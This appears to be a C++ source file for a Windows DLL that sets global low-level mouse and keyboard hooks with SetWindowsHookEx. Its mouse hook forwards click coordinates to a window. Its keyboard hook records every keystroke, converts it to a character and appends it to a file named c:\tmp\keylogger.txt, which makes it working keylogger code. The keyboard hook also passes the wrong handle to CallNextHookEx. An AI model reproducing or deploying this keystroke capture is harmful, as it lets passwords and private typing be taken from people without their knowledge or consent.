#include "hooks.h"

#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#include <stdio.h>

#include <iostream>

#pragma data_seg ("shared")
HHOOK g_hMouseHook = NULL;
HHOOK g_hKeyHook = NULL;

HINSTANCE g_hInst = NULL;
HWND g_hMouseWnd = NULL;
HWND g_hKeyWnd = NULL;
KBDLLHOOKSTRUCT kbdStruct;
BYTE keyState[256];
WCHAR buffer[16];
FILE* file = NULL;


#pragma data_seg()
#pragma comment(linker, "/SECTION:shared,RWS")

LRESULT CALLBACK MouseProc( int nCode, WPARAM wParam, LPARAM lParam );
LRESULT CALLBACK KeyProc( int nCode,  WPARAM wParam, LPARAM lParam );

BOOL APIENTRY DllMain( HINSTANCE hInst, DWORD, LPVOID )
{
    if( !g_hInst )
        g_hInst = hInst;
    return TRUE;
}

BOOL InstallMouseHook( void* hWnd )
{
    g_hMouseWnd = HWND( hWnd );
    if( g_hMouseHook != NULL )
        return TRUE;

    g_hMouseHook = SetWindowsHookEx( WH_MOUSE_LL, MouseProc, g_hInst, 0);

    if( g_hMouseHook == NULL )
        return FALSE;
    return TRUE;
}

BOOL InstallKeyHook( void* hWnd )
{
    g_hKeyWnd = HWND( hWnd );
    if( g_hKeyHook != NULL )
        return TRUE;

    g_hKeyHook = SetWindowsHookEx( WH_KEYBOARD_LL, KeyProc, g_hInst, 0);

    if( g_hKeyHook == NULL )
        return FALSE;
    return TRUE;
}


BOOL UninstallKeyHook(void*)
{
    if( g_hKeyHook != NULL )
    {
        UnhookWindowsHookEx( g_hKeyHook );
        g_hKeyHook = NULL;
    }
    return TRUE;
}

BOOL UninstallMouseHook(void*)
{
    if( g_hMouseHook != NULL )
    {
        UnhookWindowsHookEx( g_hMouseHook );
        g_hMouseHook = NULL;
    }
    return TRUE;
}

LRESULT CALLBACK MouseProc( int nCode, WPARAM wParam, LPARAM lParam )
{
    if( ( nCode >= 0 ) && ( nCode == HC_ACTION ) )
    {
        switch( wParam )
        {
        case WM_LBUTTONDOWN:
        case WM_NCLBUTTONDOWN:
            {
                MOUSEHOOKSTRUCT* mhs = (MOUSEHOOKSTRUCT*)lParam;
                HWND hwnd = g_hMouseWnd;
//                HWND caller = FindWindow(0, L"WolfClick" );
                if( hwnd )
                    PostMessage( hwnd, WM_USER+123, 0, MAKELPARAM( mhs->pt.x, mhs->pt.y ) );
//                if( caller )
//                    PostMessage( caller, WM_USER+123, 0, MAKELPARAM( mhs->pt.x, mhs->pt.y ) );
            }
            break;
        default:
            break;
        }
    }
    else
    {
        std::cout << "hello ncode" << std::endl;
    }
    return CallNextHookEx( g_hMouseHook, nCode, wParam, lParam );
}

LRESULT CALLBACK KeyProc( int nCode, WPARAM wParam, LPARAM lParam )
{
    if( ( nCode >= 0 ) && ( nCode == HC_ACTION ) )
    {
        switch( wParam )
        {
        case WM_SYSKEYDOWN:
        case WM_KEYDOWN:
            {
                std::cout << "key down up" << std::endl;
                //HWND hwnd = g_hKeyWnd;
                kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
                GetKeyboardState((PBYTE)&keyState);
                ToUnicode(kbdStruct.vkCode, kbdStruct.scanCode, (PBYTE)&keyState, (LPWSTR)&buffer, sizeof(buffer) / 2, 0);
                file = fopen("c:\\tmp\\keylogger.txt", "a");
                fprintf(file, "%c", buffer[0]);
                fclose(file);
            }
            break;
        default:
            std::cout << "default key:" << wParam << std::endl;
            break;
        }
    }
    else
    {
        std::cout << "hello ncode" << std::endl;
    }
    return CallNextHookEx( g_hMouseHook, nCode, wParam, lParam );
}
